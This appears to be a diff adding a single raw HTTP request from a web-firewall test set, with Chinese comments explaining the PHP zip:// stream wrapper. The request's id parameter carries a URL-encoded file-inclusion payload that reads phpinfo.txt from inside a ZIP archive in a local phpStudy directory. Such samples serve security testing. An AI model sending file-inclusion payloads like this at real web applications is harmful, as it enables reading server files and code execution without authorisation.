@@ -1,0 +1,9 @@
+# 文件包含_文件协议_zip协议
+# zip:// 是一种流封装器（wrapper），它允许你像访问本地文件一样访问ZIP文件中的内容。这意味着你可以使用标准的文件函数和流函数来读取ZIP文件中的文件内容，而无需先解压整个ZIP文件。
+GET /?id=zip:%2F%2FC:%5CphpStudy%5CWWW%5CFileInclusion%5Cphpinfo.zip%2523phpinfo.txt&bid=hd_tag_m8mv24o3 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24o3
+RM-PRO-Token: 2cc29b422beda6bd695a74e03e3f84e9
+RM-PRO-Time: 1742808398329
+User-Agent: curl/7.83.1
+
